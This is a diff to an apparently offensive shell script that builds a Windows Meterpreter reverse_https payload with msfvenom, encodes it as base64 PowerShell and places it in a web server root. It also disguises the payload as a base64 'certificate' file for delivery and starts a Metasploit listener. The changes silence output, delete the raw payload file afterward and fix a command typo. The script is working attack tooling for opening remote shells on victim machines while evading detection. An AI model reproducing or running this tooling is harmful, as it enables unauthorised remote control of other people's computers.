@@ -46,8 +46,8 @@ craft_payload() {
   port=${port:-'443'}
   read -p "[*]Enter web server root directory[/var/www/html]: " rootDir
   rootDir=${rootDir:-'/var/www/html'}
-  echo "[+]Creating payload"
-  msfvenom -p windows/x64/meterpreter/reverse_https LHOST=${ip_addr} LPORT=${port} -e cmd/powershell_base64 -f psh -o ${rootDir}/load.txt
+  echo "[+]Creating payload" 
+  msfvenom -p windows/x64/meterpreter/reverse_https LHOST=${ip_addr} LPORT=${port} -e cmd/powershell_base64 -f psh -o ${rootDir}/load.txt >> /dev/null
   export ip_addr;
   export port;
   export rootDir;
@@ -62,7 +62,7 @@ cradle_crafter() {
 
 craft_cert() {
   echo "[+]Crafting Certificate"
-  echo "-----BEGIN CERTIFICATE-----" > ${rootDir}/cert.cer; cat raw.txt | base64 >> ${rootDir}/cert.cer; echo "-----END CERTIFICATE-----" >> ${rootDir}/cert.cer
+  echo "-----BEGIN CERTIFICATE-----" > ${rootDir}/cert.cer; cat raw.txt | base64 >> ${rootDir}/cert.cer; echo "-----END CERTIFICATE-----" >> ${rootDir}/cert.cer;rm raw.txt
 }
 
 start_listener() {
@@ -70,7 +70,7 @@ start_listener() {
   sed -i "s/LHOST .*/LHOST ${ip_addr}/" reverse_https.rc
   sed -i "s/LPORT .*/LPORT ${port}/" reverse_https.rc
 
-  msfconsole -r remsfconsole -r reverse_https.rc
+  msfconsole -r reverse_https.rc
 
 }
 
